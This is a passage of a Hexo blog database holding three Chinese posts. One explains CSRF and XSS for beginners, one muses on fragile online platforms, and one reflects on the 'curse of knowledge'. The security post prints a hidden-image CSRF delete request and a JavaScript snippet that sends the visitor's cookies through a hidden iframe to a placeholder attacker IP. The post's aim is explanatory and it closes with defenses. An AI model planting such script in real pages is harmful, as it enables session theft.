document);\n```\n\n明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。\n\n与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。\n\n---\n\n所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。\n\n因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。\n\n道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。\n","slug":"CSRF-和-XSS","published":1,"updated":"2020-03-07T08:02:18.279Z","_id":"ck7h91ty30009633xaeok9jaa","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。</p>\n<a id=\"more\"></a>\n\n<p>说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？</p>\n<p>不过，我还是想做个简短的笔记，来回忆这几天的想法。</p>\n<h2 id=\"什麽是-CSRF\"><a href=\"#什麽是-CSRF\" class=\"headerlink\" title=\"什麽是 CSRF\"></a>什麽是 CSRF</h2><p>Crossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。</p>\n<p>在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。</p>\n<p>大坏蛋就利用这两个机制，发起了 CSRF。</p>\n<p>举个简单的例子。小明在 A 网站（<a href=\"http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了\" target=\"_blank\" rel=\"noopener\">http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了</a> Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;A&#x2F;delete?id&#x3D;3&#39; width&#x3D;&#39;0&#39; height&#x3D;&#39;0&#39; &#x2F;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。</p>\n<p>如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 <a href=\"https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有\" target=\"_blank\" rel=\"noopener\">https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有</a> cookies，没有登录，拒决了访问。</p>\n<p>但对小明而言，这就是大问题了。小明的浏览器会访问 <a href=\"https://A/delete?id=3，然后将\" target=\"_blank\" rel=\"noopener\">https://A/delete?id=3，然后将</a> A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。</p>\n<p>于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。</p>\n<p>CSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。</p>\n<h2 id=\"什麽是XSS\"><a href=\"#什麽是XSS\" class=\"headerlink\" title=\"什麽是XSS\"></a>什麽是XSS</h2><p>和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。</p>\n<p>但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。</p>\n<p>还是个简单的例子。</p>\n<p>小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。</p>\n<p>然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 用 &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt; 包起来放在文章中</span><br><span class=\"line\">(function(window, document) &#123;</span><br><span class=\"line\">    var cookies &#x3D; document.cookie;</span><br><span class=\"line\">    var xssURIBase &#x3D; &quot;http:&#x2F;&#x2F;小坏蛋的IP&#x2F;myxss&#x2F;&quot;;</span><br><span class=\"line\">    var xssURI &#x3D; xssURIBase + window.encodeURI(cookies);</span><br><span class=\"line\">    &#x2F;&#x2F; 建立隐藏 iframe 用于通讯</span><br><span class=\"line\">    var hideFrame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class=\"line\">    hideFrame.height &#x3D; 0;</span><br><span class=\"line\">    hideFrame.width &#x3D; 0;</span><br><span class=\"line\">    hideFrame.style.display &#x3D; &quot;none&quot;;</span><br><span class=\"line\">    hideFrame.src &#x3D; xssURI;</span><br><span class=\"line\">    document.body.appendChild(hideFrame);</span><br><span class=\"line\">&#125;)(window, document);</span><br></pre></td></tr></table></figure>\n\n<p>明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。</p>\n<p>与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。</p>\n<hr>\n<p>所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。</p>\n<p>因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。</p>\n<p>道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。</p>\n","site":{"data":{}},"excerpt":"<p>最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。</p>","more":"<p>说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？</p>\n<p>不过，我还是想做个简短的笔记，来回忆这几天的想法。</p>\n<h2 id=\"什麽是-CSRF\"><a href=\"#什麽是-CSRF\" class=\"headerlink\" title=\"什麽是 CSRF\"></a>什麽是 CSRF</h2><p>Crossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。</p>\n<p>在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。</p>\n<p>大坏蛋就利用这两个机制，发起了 CSRF。</p>\n<p>举个简单的例子。小明在 A 网站（<a href=\"http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了\" target=\"_blank\" rel=\"noopener\">http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了</a> Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;A&#x2F;delete?id&#x3D;3&#39; width&#x3D;&#39;0&#39; height&#x3D;&#39;0&#39; &#x2F;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。</p>\n<p>如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 <a href=\"https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有\" target=\"_blank\" rel=\"noopener\">https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有</a> cookies，没有登录，拒决了访问。</p>\n<p>但对小明而言，这就是大问题了。小明的浏览器会访问 <a href=\"https://A/delete?id=3，然后将\" target=\"_blank\" rel=\"noopener\">https://A/delete?id=3，然后将</a> A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。</p>\n<p>于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。</p>\n<p>CSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。</p>\n<h2 id=\"什麽是XSS\"><a href=\"#什麽是XSS\" class=\"headerlink\" title=\"什麽是XSS\"></a>什麽是XSS</h2><p>和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。</p>\n<p>但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。</p>\n<p>还是个简单的例子。</p>\n<p>小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。</p>\n<p>然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 用 &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt; 包起来放在文章中</span><br><span class=\"line\">(function(window, document) &#123;</span><br><span class=\"line\">    var cookies &#x3D; document.cookie;</span><br><span class=\"line\">    var xssURIBase &#x3D; &quot;http:&#x2F;&#x2F;小坏蛋的IP&#x2F;myxss&#x2F;&quot;;</span><br><span class=\"line\">    var xssURI &#x3D; xssURIBase + window.encodeURI(cookies);</span><br><span class=\"line\">    &#x2F;&#x2F; 建立隐藏 iframe 用于通讯</span><br><span class=\"line\">    var hideFrame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class=\"line\">    hideFrame.height &#x3D; 0;</span><br><span class=\"line\">    hideFrame.width &#x3D; 0;</span><br><span class=\"line\">    hideFrame.style.display &#x3D; &quot;none&quot;;</span><br><span class=\"line\">    hideFrame.src &#x3D; xssURI;</span><br><span class=\"line\">    document.body.appendChild(hideFrame);</span><br><span class=\"line\">&#125;)(window, document);</span><br></pre></td></tr></table></figure>\n\n<p>明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。</p>\n<p>与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。</p>\n<hr>\n<p>所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。</p>\n<p>因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。</p>\n<p>道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。</p>"},{"title":"某明星与亚文化平台","date":"2020-03-07T08:14:24.000Z","_content":"\n我向来是不关心国内小鲜肉市场的（主要看他们长得帅，把女孩都吸走了，气！），但这次的主角比较特殊（某个女孩特别喜欢他，甚至不惜绕着厦门岛转，就是想看他一眼，想到这里就更气了！）。但不想针对谁，评价人不是我的强项。\n\n<!-- more -->\n\n「网站被封，资源找不到」，我想这是互联网的常态，更何况各种亚文化平台。无论有没有人举报，互联网的数据都是脆弱的，任何平台都有可能在今天或者明天消失不见。几年前我很迷恋平台，办了很多会员，到最后发现有些网站两年就易主了，有些歌就算是会员，你也得花钱买，昨天刚玩的游戏，明天就可能触点下架。\n\n现有平台太脆弱了，互联网需要新的方向。在新的方案出来前，我已经逐步把数据迁回本地。重要的文章、日记已经做了多个备份，喜欢的电影、歌、剧都留在硬盘，游戏尽量在 gog 买，在 steam 上买但比较喜欢的游戏，尽量会弄一份盗版，以防 steam 消失后，无法运行。甚至在 b 站没做大前，做了一个批量下载脚本，尝试把喜欢的视频载下来。\n\n蚂蚁是脆弱的，就算聚成一窝，也同样脆弱。\n\n---\n\n一个小彩蛋，ROR 要火（\n\n![小网站是由ror做的](WechatIMG87.jpeg)","source":"_posts/某明星与亚文化平台.md","raw":"---\ntitle: 某明星与亚文化平台\ndate: 2020-03-07 16:14:24\ntags:\n---\n\n我向来是不关心国内小鲜肉市场的（主要看他们长得帅，把女孩都吸走了，气！），但这次的主角比较特殊（某个女孩特别喜欢他，甚至不惜绕着厦门岛转，就是想看他一眼，想到这里就更气了！）。但不想针对谁，评价人不是我的强项。\n\n<!-- more -->\n\n「网站被封，资源找不到」，我想这是互联网的常态，更何况各种亚文化平台。无论有没有人举报，互联网的数据都是脆弱的，任何平台都有可能在今天或者明天消失不见。几年前我很迷恋平台，办了很多会员，到最后发现有些网站两年就易主了，有些歌就算是会员，你也得花钱买，昨天刚玩的游戏，明天就可能触点下架。\n\n现有平台太脆弱了，互联网需要新的方向。在新的方案出来前，我已经逐步把数据迁回本地。重要的文章、日记已经做了多个备份，喜欢的电影、歌、剧都留在硬盘，游戏尽量在 gog 买，在 steam 上买但比较喜欢的游戏，尽量会弄一份盗版，以防 steam 消失后，无法运行。甚至在 b 站没做大前，做了一个批量下载脚本，尝试把喜欢的视频载下来。\n\n蚂蚁是脆弱的，就算聚成一窝，也同样脆弱。\n\n---\n\n一个小彩蛋，ROR 要火（\n\n![小网站是由ror做的](WechatIMG87.jpeg)","slug":"某明星与亚文化平台","published":1,"updated":"2020-03-07T12:35:38.978Z","_id":"ck7hc1f5p0000su3xg4hu1ehj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我向来是不关心国内小鲜肉市场的（主要看他们长得帅，把女孩都吸走了，气！），但这次的主角比较特殊（某个女孩特别喜欢他，甚至不惜绕着厦门岛转，就是想看他一眼，想到这里就更气了！）。但不想针对谁，评价人不是我的强项。</p>\n<a id=\"more\"></a>\n\n<p>「网站被封，资源找不到」，我想这是互联网的常态，更何况各种亚文化平台。无论有没有人举报，互联网的数据都是脆弱的，任何平台都有可能在今天或者明天消失不见。几年前我很迷恋平台，办了很多会员，到最后发现有些网站两年就易主了，有些歌就算是会员，你也得花钱买，昨天刚玩的游戏，明天就可能触点下架。</p>\n<p>现有平台太脆弱了，互联网需要新的方向。在新的方案出来前，我已经逐步把数据迁回本地。重要的文章、日记已经做了多个备份，喜欢的电影、歌、剧都留在硬盘，游戏尽量在 gog 买，在 steam 上买但比较喜欢的游戏，尽量会弄一份盗版，以防 steam 消失后，无法运行。甚至在 b 站没做大前，做了一个批量下载脚本，尝试把喜欢的视频载下来。</p>\n<p>蚂蚁是脆弱的，就算聚成一窝，也同样脆弱。</p>\n<hr>\n<p>一个小彩蛋，ROR 要火（</p>\n<p><img src=\"WechatIMG87.jpeg\" alt=\"小网站是由ror做的\"></p>\n","site":{"data":{}},"excerpt":"<p>我向来是不关心国内小鲜肉市场的（主要看他们长得帅，把女孩都吸走了，气！），但这次的主角比较特殊（某个女孩特别喜欢他，甚至不惜绕着厦门岛转，就是想看他一眼，想到这里就更气了！）。但不想针对谁，评价人不是我的强项。</p>","more":"<p>「网站被封，资源找不到」，我想这是互联网的常态，更何况各种亚文化平台。无论有没有人举报，互联网的数据都是脆弱的，任何平台都有可能在今天或者明天消失不见。几年前我很迷恋平台，办了很多会员，到最后发现有些网站两年就易主了，有些歌就算是会员，你也得花钱买，昨天刚玩的游戏，明天就可能触点下架。</p>\n<p>现有平台太脆弱了，互联网需要新的方向。在新的方案出来前，我已经逐步把数据迁回本地。重要的文章、日记已经做了多个备份，喜欢的电影、歌、剧都留在硬盘，游戏尽量在 gog 买，在 steam 上买但比较喜欢的游戏，尽量会弄一份盗版，以防 steam 消失后，无法运行。甚至在 b 站没做大前，做了一个批量下载脚本，尝试把喜欢的视频载下来。</p>\n<p>蚂蚁是脆弱的，就算聚成一窝，也同样脆弱。</p>\n<hr>\n<p>一个小彩蛋，ROR 要火（</p>\n<p><img src=\"WechatIMG87.jpeg\" alt=\"小网站是由ror做的\"></p>"},{"title":"知识的诅咒","date":"2020-03-31T15:41:02.000Z","_content":"\n在没人帮忙的情况下，第一次动手画原型。\n\n<!--more-->\n\n在画的时候，总是觉得有那么点不自然。明明画画还算得心应手，怎么画原型的时候就有种违和的感觉？仔细想了想，在动手画之前，脑袋里就已经有了代码。看上去是在画原型，但实际上只是将脑袋里的代码变成了图形。\n\n当年任天堂在招游戏制作人时，一条特殊要求，就是希望来应聘的人不是游戏玩家，最好是连游戏都没有玩过的人。这听起来很奇怪，明明是一家游戏的公司，也是在招游戏制作人，选游戏玩家，热爱游戏的人不更好吗？\n\n因为他们觉得，如果做游戏的人也是游戏玩家的话，在他们做游戏的时，脑袋里想的都是之前玩过的游戏，他们的工作就会从创造，变成了完善之前的游戏。然后，那年他们招进了木匠背景的游戏制作人青沼英二，后来，他来到宫本茂手下，跟着做塞尔达传说。然后 2017 年，他带着任天堂的新时代游戏教科书——《塞尔达传说：荒野之息》震惊了整个游戏世界。\n\n知道的越多，固有印象就越深，一些时候可能更难以创造出有趣的东西。这也是一种诅咒吧——知识的诅咒。\n","source":"_posts/知识的诅咒.md","raw":"---\ntitle: 知识的诅咒\ndate: 2020-03-31 23:41:02\ntags: 随想\n---\n\n在没人帮忙的情况下，第一次动手画原型。\n\n<!--more-->\n\n在画的时候，总是觉得有那么点不自然。明明画画还算得心应手，怎么画原型的时候就有种违和的感觉？仔细想了想，在动手画之前，脑袋里就已经有了代码。看上去是在画原型，但实际上只是将脑袋里的代码变成了图形。\n\n当年任天堂在招游戏制作人时，一条特殊要求，就是希望来应聘的人不是游戏玩家，最好是连游戏都没有玩过的人。这听起来很奇怪，明明是一家游戏的公司，也是在招游戏制作人，选游戏玩家，热爱游戏的人不更好吗？\n\n因为他们觉得，如果做游戏的人也是游戏玩家的话，在他们做游戏的时，脑袋里想的都是之前玩过的游戏，他们的工作就会从创造，变成了完善之前的游戏。然后，那年他们招进了木匠背景的游戏制作人青沼英二，后来，他来到宫本茂手下，跟着做塞尔达传说。然后 2017 年，他带着任天堂的新时代游戏教科书——《塞尔达传说：荒野之息》震惊了整个游戏世界。\n\n知道的越多，固有印象就越深，一些时候可能更难以创造出有趣的东西。这也是一种诅咒吧——知识的诅咒。\n","slug":"知识的诅咒","published":1,"updated":"2020-03-31T15:44:23.805Z","_id":"ck8g2lwho00001n3xhui4ft9q","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在没人帮忙的情况下，第一次动手画原型。</p>\n<a id=\"more\"></a>\n\n<p>在画的时候，总是觉得有那么点不自然。明明画画还算得心应手，怎么画原型的时候就有种违和的感觉？仔细想了想，在动手画之前，脑袋里就已经有了代码。看上去是在画原型，但实际上只是将脑袋里的代码变成了图形。</p>\n<p>当年任天堂在招游戏制作人时，一条特殊要求，就是希望来应聘的人不是游戏玩家，最好是连游戏都没有玩过的人。这听起来很奇怪，明明是一家游戏的公司，也是在招游戏制作人，选游戏玩家，热爱游戏的人不更好吗？</p>\n<p>因为他们觉得，如果做游戏的人也是游戏玩家的话，在他们做游戏的时，脑袋里想的都是之前玩过的游戏，他们的工作就会从创造，变成了完善之前的游戏。然后，那年他们招进了木匠背景的游戏制作人青沼英二，后来，他来到宫本茂手下，跟着做塞尔达传说。然后 2017 年，他带着任天堂的新时代游戏教科书——《塞尔达传说：荒野之息》震惊了整个游戏世界。</p>\n<p>知道的越多，固有印象就越深，一些时候可能更难以创造出有趣的东西。这也是一种诅咒吧——知识的诅咒。</p>\n","site":{"data":{}},"excerpt":"<p>在没人帮忙的情况下，第一次动手画原型。</p>","more":"<p>在画的时候，总是觉得有那么点不自然。明明画画还算得心应手，怎么画原型的时候就有种违和的感觉？仔细想了想，在动手画之前，脑袋里就已经有了代码。看上去是在画原型，但实际上只是将脑袋里的代码变成了图形。</p>\n<p>当年任天堂在招游戏制作人时，一条特殊要求，就是希望来应聘的人不是游戏玩家，最好是连游戏都没有玩过的人。这听起来很奇怪，明明是一家游戏的公司，也是在招游戏制作人，选游戏玩家，热爱游戏的人不更好吗？</p>\n<p>因为他们觉得，如果做游戏的人也是游戏玩家的话，在他们做游戏的时，脑袋里想的都是之前玩过的游戏，他们的工作就会从创造，变成了完善之前的游戏。然后，那年他们招进了木匠背景的游戏制作人青沼英二，后来，他来到宫本茂手下，跟着做塞尔达传说。然后 2017 年，他带着任天堂的新时代游戏教科书——《塞尔达传说：荒野之息》震惊了整个游戏世界。</p>\n<p>知道的越多，固有印象就越深，一些时候可能更难以创造出有趣的东西。这也是一种诅咒吧——知识的诅咒。</p>"}],"PostAsset":[{"_id":"source/_posts/我不喜歡安卓/1559449236027.png","slug":"1559449236027.png","post":"ck7h6cgl100013j3x2vs02evt","modified":0,"renderable":0},{"_id":"source/_posts/做點小工作/1559472290996.png","slug":"1559472290996.png","post":"ck7h6rnf800004z3x0hfgh118","modified":0,"renderable":0},{"_id":"source/_posts/做點小工作/1559472330222.png","slug":"1559472330222.png","post":"ck7h6rnf800004z3x0hfgh118","modified":0,"renderable":0},{"_id":"source/_posts/做點小工作/1559472386325.png","slug":"1559472386325.png","post":"ck7h6rnf800004z3x0hfgh118","modified":0,"renderable":0},{"_id":"source/_posts/做點小工作/1559472409652.png","slug":"1559472409652.png","post":"ck7h6rnf800004z3x0hfgh118","modified":0,"renderable":0},{"_id":"source/_posts/面向接口/1564906395080.png","slug":"1564906395080.png","post":"ck7h7792y0002633x26rl5flh","modified":0,"renderable":0},{"_id":"source/_posts/对于虚拟化的执着/1565527230467.gif","slug":"1565527230467.gif","post":"ck7h7gcp50003633x4f3ehvat","modified":0,"renderable":0},{"_id":"source/_posts/虚拟内存/1566035265964.png","slug":"1566035265964.png","post":"ck7h7k1df0004633x0a98blt0","modified":0,"renderable":0},{"_id":"source/_posts/调度算法（一）/1567392403118.png","slug":"1567392403118.png","post":"ck7h7mt5b0005633xh88pd6nm","modified":0,"renderable":0},{"_id":"source/_posts/调度算法（一）/1567392403168.png","slug":"1567392403168.png","post":"ck7h7mt5b0005633xh88pd6nm","modified":0,"renderable":0},{"_id":"source/_posts/段式存储/1569248244054.png","slug":"1569248244054.png","post":"ck7h7wnck0007633x1jqddsen","modified":0,"renderable":0},{"_id":"source/_posts/段式存储/1569248251853.png","slug":"1569248251853.png","post":"ck7h7wnck0007633x1jqddsen","modified":0,"renderable":0},{"_id":"source/_posts/线程锁（一）/1570974760163.png","slug":"1570974760163.png","post":"ck7h80pzh0008633x5t276ads","modified":0,"renderable":0},{"_id":"source/_posts/线程锁（一）/1570974768741.png","slug":"1570974768741.png","post":"ck7h80pzh0008633x5t276ads","modified":0,"renderable":0},{"_id":"source/_posts/线程锁（一）/1570974768743.png","slug":"1570974768743.png","post":"ck7h80pzh0008633x5t276ads","modified":0,"renderable":0},{"_id":"source/_posts/线程锁（一）/1570974769063.png","slug":"1570974769063.png","post":"ck7h80pzh0008633x5t276ads","modified":0,"renderable":0},{"_id":"source/_posts/某明星与亚文化平台/WechatIMG87.jpeg","slug":"WechatIMG87.jpeg","post":"ck7hc1f5p0000su3xg4hu1ehj","modified":0,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"ck8g2lwho00001n3xhui4ft9q","tag_id":"ck8g2nt1e00002m3x2grmc1l2","_id":"ck8g2nt2100012m3x72jqezdf"}],"Tag":[{"name":"随想","_id":"ck8g2nt1e00002m3x2grmc1l2"}]}}